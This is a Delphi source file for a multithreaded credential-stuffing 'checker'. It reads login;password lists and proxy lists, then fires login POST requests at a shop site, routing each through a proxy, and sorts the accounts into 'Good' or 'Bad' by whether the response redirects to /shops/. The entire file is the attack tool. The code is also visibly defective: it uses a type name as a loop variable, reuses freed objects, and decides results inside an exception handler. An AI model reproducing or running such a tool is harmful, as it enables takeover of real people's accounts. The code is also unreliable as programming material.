unit Unit1;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.StdCtrls, sButton, sSkinProvider,
  sSkinManager, sEdit, sSpinEdit, sMemo, httpsend,ssl_openssl,ssl_openssl_lib,
  sLabel, sGauge,ExtCtrls, XPMan, sDialogs, SyncObjs;

type
  TForm1 = class(TForm)
    sSkinManager1: TsSkinManager;
    sSkinProvider1: TsSkinProvider;
    sButton1: TsButton;
    sButton2: TsButton;
    sButton3: TsButton;
    sButton4: TsButton;
    sMemo1: TsMemo;
    sSpinEdit1: TsSpinEdit;
    sGauge1: TsGauge;
    sLabel1: TsLabel;
    sLabel2: TsLabel;
    GoodLabel: TsLabel;
    BadLabel: TsLabel;
    sOpenDialog1: TsOpenDialog;
    procedure sButton3Click(Sender: TObject);
    procedure sButton4Click(Sender: TObject);
    procedure sButton2Click(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure sButton1Click(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

  type
  Thread = class(TThread)
  private
    HTTP: tHTTPsend;
    Result: integer;
    FAcc : string;
    FPas : string;
    IP   : string;
    Port : string;
  protected
    procedure Execute; override;
    procedure Local;
    constructor Create(CreateSuspended: Boolean);
    destructor Destroy; override;
  end;

var
  Form1: TForm1;
  LocalWork: boolean;
  Target: string;
  Accounts, Proxy:Tstringlist;
  Acc:integer;
  Work:boolean;
  CS:Tcriticalsection;
  GoodFile, BadFile: textfile;

implementation

{$R *.dfm}

{ Thread }

constructor Thread.Create(CreateSuspended: Boolean);
begin
 inherited;
 priority:=tpTimeCritical;
 Freeonterminate:=true;
 resume;
end;

destructor Thread.Destroy;
begin
  inherited;
  freeandnil(HTTP);
end;

procedure Thread.Execute;
var CurAcc:integer;
    data:Tstringlist;
begin
  HTTP:=tHTTPsend.Create;

  while(LocalWork=true) do begin
    if Localwork=true then begin
    http.Headers.clear;
    http.Document.Clear;
    http.Cookies.Clear;

    CS.Enter;
    Inc(Acc);
    if Acc<Accounts.Count then CurAcc:=Acc else Work:=false;
    CS.Leave;

   if Work then
    begin

     if Proxy.Text = '' then sleep(0) else
     begin
     IP:= Copy(Proxy[CurAcc],1,Pos(':',Proxy[CurAcc])-1);
     Port:= Copy(Proxy[CurAcc],Pos(':',Proxy[CurAcc])+1,Length(Proxy[CurAcc]));
     http.proxyhost:=ip;
     http.ProxyPort:=strtoint(port);
     end;

     FAcc:= Copy(Accounts[CurAcc],1,Pos(';',Accounts[CurAcc])-1);
     FPas:= Copy(Accounts[CurAcc],Pos(';',Accounts[CurAcc])+1,Length(Accounts[CurAcc]));

     data:=Tstringlist.create;
     data.Add('login='+FAcc);
     data.Add('password='+FPas);
     data.Add('submit=');
     http.Document.LoadFromStream(data);
     try
     http.HTTPMethod('POST','link');
      Result:=-1;
     except
      if Pos('Location: /shops/', http.Document)<>0 then
       Result:=1
      else
       Result:=2;
     end;
     HTTP.Free;
     data.Free;

     Synchronize(Local);
    end;

    end else begin
    freeandnil(HTTP);
    EndThread(0);
    end;

  end;
end;

procedure Thread.Local;
begin
 if Result=1 then Form1.sMemo1.Lines.Add('Good found');
 if Result=2 then Form1.sMemo1.Lines.Add('Bad found');
end;

procedure TForm1.FormCreate(Sender: TObject);
begin
 Accounts:=Tstringlist.create;
 Proxy:=Tstringlist.create;
 CS:=TcriticalSection.create;
end;

procedure TForm1.sButton1Click(Sender: TObject);
begin
 sOpenDialog1.InitialDir:=ExtractFilePath(Application.ExeName);
 if sOpenDialog1.Execute then
  begin
   Accounts.Clear;
   Accounts.LoadFromFile(sOpenDialog1.FileName);
  end;
end;

procedure TForm1.sButton2Click(Sender: TObject);
begin
sOpenDialog1.FileName:='';
 sOpenDialog1.InitialDir:=ExtractFilePath(Application.ExeName);
 if sOpenDialog1.Execute then
  begin
   Proxy.Clear;
   Proxy.LoadFromFile(sOpenDialog1.FileName);
  end;
end;

procedure TForm1.sButton3Click(Sender: TObject);
begin
sMemo1.Clear;

 Assignfile(GoodFile, ExtractFilePath(Application.ExeName)+'good.txt');
 Rewrite(GoodFile);
 Closefile(GoodFile);
 Assignfile(BadFile, ExtractFilePath(Application.ExeName)+'bad.txt');
 Rewrite(BadFile);
 Closefile(BadFile);
 GoodLabel.Caption:='0';
 BadLabel.Caption:='0';
 sGauge1.MaxValue:=Accounts.Count;
 sGauge1.Progress:=0;

sButton3.Enabled:=false;
sButton4.Enabled:=true;
LocalWork:= true;

for Thread := 0 to sspinedit1.value-1 do Thread.Create(True);

end;

procedure TForm1.sButton4Click(Sender: TObject);
begin
LocalWork:=false;
sButton3.Enabled:=true;
sButton4.Enabled:=false;
end;

end.
